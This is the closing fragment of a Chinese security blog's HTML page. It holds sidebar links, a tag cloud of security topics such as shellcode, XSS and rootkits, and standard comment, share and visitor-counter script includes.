      <li>
        <a href="/2014/03/21/buybook/">购书心得</a>
      </li>
    
      <li>
        <a href="/2013/03/23/CanSecWest-2013/">关于CanSecWest 2013大会</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/技术分享/">技术分享</a><small>22</small></li>
  
    <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>3</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/ASLR/" style="font-size: 10px;">ASLR</a> <a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/BlackHat/" style="font-size: 15px;">BlackHat</a> <a href="/tags/CanSecWest/" style="font-size: 15px;">CanSecWest</a> <a href="/tags/DEP/" style="font-size: 10px;">DEP</a> <a href="/tags/Flash/" style="font-size: 10px;">Flash</a> <a href="/tags/Fuzzing/" style="font-size: 10px;">Fuzzing</a> <a href="/tags/GS/" style="font-size: 10px;">GS</a> <a href="/tags/Heap-Spray/" style="font-size: 10px;">Heap Spray</a> <a href="/tags/OSX/" style="font-size: 10px;">OSX</a> <a href="/tags/PHDays/" style="font-size: 10px;">PHDays</a> <a href="/tags/Perl/" style="font-size: 10px;">Perl</a> <a href="/tags/SafeSEH/" style="font-size: 10px;">SafeSEH</a> <a href="/tags/Windows/" style="font-size: 15px;">Windows</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/书籍/" style="font-size: 20px;">书籍</a> <a href="/tags/内核/" style="font-size: 10px;">内核</a> <a href="/tags/安全审计/" style="font-size: 15px;">安全审计</a> <a href="/tags/恶意软件/" style="font-size: 15px;">恶意软件</a> <a href="/tags/打印机/" style="font-size: 10px;">打印机</a> <a href="/tags/溢出/" style="font-size: 10px;">溢出</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/监控取证/" style="font-size: 10px;">监控取证</a> <a href="/tags/编程/" style="font-size: 10px;">编程</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a>
  </div>
</div>


  <div class="widget tag">
    <h3 class="title">最新评论</h3>
    <ul class="entry">
        <!-- 多说最新评论 start -->
                <div class="ds-recent-comments" data-num-items="5" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
        <!-- 多说最新评论 end -->
        <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
        <script type="text/javascript">
        var duoshuoQuery = {short_name:"riusksk"};
                (function() {
                        var ds = document.createElement('script');
                        ds.type = 'text/javascript';ds.async = true;
                        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
                        ds.charset = 'UTF-8';
                        (document.getElementsByTagName('head')[0] 
                         || document.getElementsByTagName('body')[0]).appendChild(ds);
                })();
                </script>
        <!-- 多说公共JS代码 end -->
    </ul>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2016 riusksk
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
  & Hosted by <a href="http://github.com" target="_blank">GitHub</a>
  <!--<span id="busuanzi_container_site_pv" >
    ，本站总访问量<span id="busuanzi_value_site_pv" ></span>次
  </span>
  -->
  </p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
</footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>